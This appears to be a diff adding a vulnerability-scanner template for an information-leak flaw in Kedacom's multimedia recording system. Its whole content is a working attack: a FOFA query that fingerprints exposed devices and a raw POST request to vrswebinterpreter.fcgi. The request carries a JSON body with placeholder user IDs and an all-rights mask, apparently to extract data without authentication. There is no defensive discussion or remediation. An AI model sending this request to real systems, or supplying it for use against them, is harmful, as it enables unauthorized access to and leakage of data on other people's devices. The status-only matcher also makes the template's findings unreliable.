@@ -1,0 +1,38 @@
+id: poc-gf74uyhtgqf7k04e
+info:
+  name: 苏州科达科技股份有限公司多媒体录播系统存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gf74uyhtgqf7k04e'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gf74uyhtgqf7k04e
+    fofa: body="kedaname" || body="KEDACOM" || body="www.kedacom.com" || body="科达多媒体录播系统"
+http:
+- raw:
+  - 'POST /fcgi-bin/vrswebinterpreter.fcgi HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+
+    Content-Length: 214
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: en
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    {"msgid":3061,"usermoid":"11111111-11111111-11111111-11111111","userdomainmoid":"11111111-11111111-11111111-11111111","rightmask":268435455,"content":{"userdomainmoid":"","StartPos":0,"EndPos":14,"IncludeName":""}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
